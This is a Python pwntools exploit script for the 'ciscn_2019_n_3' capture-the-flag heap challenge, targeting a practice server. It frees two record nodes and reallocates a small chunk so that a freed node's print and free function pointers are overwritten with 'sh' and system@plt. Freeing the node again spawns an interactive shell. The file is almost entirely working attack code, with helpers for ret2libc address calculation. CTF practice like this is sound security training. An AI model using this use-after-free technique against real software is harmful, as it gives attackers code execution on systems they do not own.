from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv


#
# records[i]->node
#
# node                 --malloc(0x1c) --0x10
# {
# print_fun,
# free_fun,
# union{
#   int interger,
#   char* text         --malloc
# }

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

# context(os='linux', arch='amd64', log_level='debug')
context(os='linux', arch='i386', log_level='debug')
binary = './ciscn_2019_n_3'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',28702) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(index,len,content):
    sla(b'> ',b'1')
    sla(b'> ', int2bytes(index))
    sla(b'> ',b'2')
    sla(b'> ',int2bytes(len))
    sla(b'Value > ',content)

def show(index):
    sla(b'> ',b'3')
    sla(b'> ',int2bytes(index))

# def edit(index,content):
#     sla(b'> ',b'4')
#     sla(b':',int2bytes(index))
#     sa(b':',content)

def delete(index):
    sla(b'> ',b'2')
    sla(b'> ',int2bytes(index))

add(0,0x20,b'a') #0  0xc -> 0x20
add(1,0x20,b'b') #1  0xc -> 0x20

delete(0)
delete(1)

system_plt = elf.plt['system']
payload = b'sh'.ljust(0x4, b'\x00') + p32(system_plt)
add(2,0xc,payload) #0 0xc -> 0xc   1->0(修改了0的node域中的free_fun和print_fun)

delete(0)


itr()